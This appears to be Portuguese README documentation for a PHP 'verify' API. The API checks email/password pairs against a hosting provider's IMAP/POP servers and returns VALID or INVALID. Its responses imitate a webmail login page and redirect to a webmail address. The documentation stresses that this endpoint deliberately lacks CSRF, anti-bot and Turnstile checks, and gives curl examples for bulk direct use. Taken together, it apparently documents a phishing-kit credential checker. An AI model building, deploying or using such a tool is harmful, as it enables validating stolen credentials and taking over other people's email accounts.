# API Verify — E-mail + Senha

Endpoint simples: **só e-mail e senha**, mesma resposta JSON do `index` / `api/login.php`.

## URL

```
POST /api/verify.php
```

## Entrada

**Form-urlencoded** ou **JSON**:

| Campo | Alternativa Roundcube | Obrigatório |
|-------|----------------------|-------------|
| `email` | `_user` | Sim |
| `password` | `_pass` | Sim |

### Exemplo curl (form)

```bash
curl -X POST "http://127.0.0.1:8080/api/verify.php" \
  -H "Accept: application/json" \
  -d "email=usuario@empresa.com.br" \
  -d "password=SuaSenha123"
```

### Exemplo curl (JSON)

```bash
curl -X POST "http://127.0.0.1:8080/api/verify.php" \
  -H "Content-Type: application/json" \
  -H "Accept: application/json" \
  -d "{\"email\":\"usuario@empresa.com.br\",\"password\":\"SuaSenha123\"}"
```

## Respostas

### Válido — HTTP 200

```json
{
  "ok": true,
  "message": "success",
  "text": "Login realizado com sucesso. Redirecionando…",
  "level": "success",
  "redirect": "https://webmail-seguro.com.br/",
  "result": "VALID",
  "email": "usuario@empresa.com.br",
  "requires_2fa": true,
  "note": "Credenciais IMAP válidas. Webmail oficial pode exigir Turnstile + código 2FA."
}
```

### Inválido — HTTP 401

```json
{
  "ok": false,
  "message": "wrong_password",
  "text": "Ops! E-mail e senha não combinam",
  "level": "warning",
  "error": "invalid_credentials",
  "result": "INVALID",
  "email": "usuario@empresa.com.br"
}
```

### E-mail vazio — HTTP 400

```json
{
  "ok": false,
  "message": "emptyemail",
  "text": "Você precisa digitar o email para prosseguir!",
  "level": "warning",
  "error": "empty_email"
}
```

### Senha vazia — HTTP 400

```json
{
  "ok": false,
  "message": "emptypass",
  "text": "Você precisa digitar a senha para prosseguir!",
  "level": "warning",
  "error": "empty_password"
}
```

## Diferença entre endpoints

| Endpoint | CSRF | Anti-bot | Turnstile | Uso |
|----------|------|----------|-----------|-----|
| `/api/login.php` | Sim | Sim | Sim (front) | Formulário do index |
| `/api/verify.php` | **Não** | **Não** | **Não** | API direta e-mail/senha |

## Validação

Com `mailbox_verify: true` em `config.local.php`, a API testa credenciais via **IMAP/POP** Locaweb:

- Host principal: `email-ssl.com.br:993`
- Fallback: `mail.dominio.com.br`, `imap.dominio.com.br`

## Teste CLI (servidor com PHP)

```bash
php tools/test_api_verify.php email@dominio.com.br senha
```

## Servidor local

```bash
php -S 127.0.0.1:8080 router.php
```

Acesse: `http://127.0.0.1:8080/api/verify.php`
